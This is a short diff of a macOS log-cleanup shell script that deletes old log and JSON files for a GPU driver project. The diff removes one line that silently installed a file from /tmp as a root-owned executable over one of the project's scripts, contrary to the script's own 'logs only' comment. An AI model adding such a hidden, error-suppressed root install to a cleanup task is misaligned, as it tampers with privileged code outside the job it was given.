@@ -3,7 +3,6 @@
 # Touches only log outputs: never kexts, scripts, backups, version files or the AuxKC.
 REF=/private/var/run/logclean.ref; touch "$REF"
 A=/Library/NativeDriverLab/autogpu; U=/Users/dhruveen
-install -o root -g wheel -m 755 /tmp/auxrebuild.new "$A/auxrebuild.sh" 2>/dev/null || true
 before=$(df -k / | awk 'NR==2{print $3}')
 n=0; del() { for f in "$@"; do [ -f "$f" ] && [ ! "$f" -nt "$REF" ] && rm -f "$f" && n=$((n+1)); done; }
 del $A/log-*.txt $A/boot-*.log $A/stage-*.log $A/status-*.log $A/bootstrap-*.json $A/compute1-*.json $A/compute2-*.json $A/accelgo-*.json
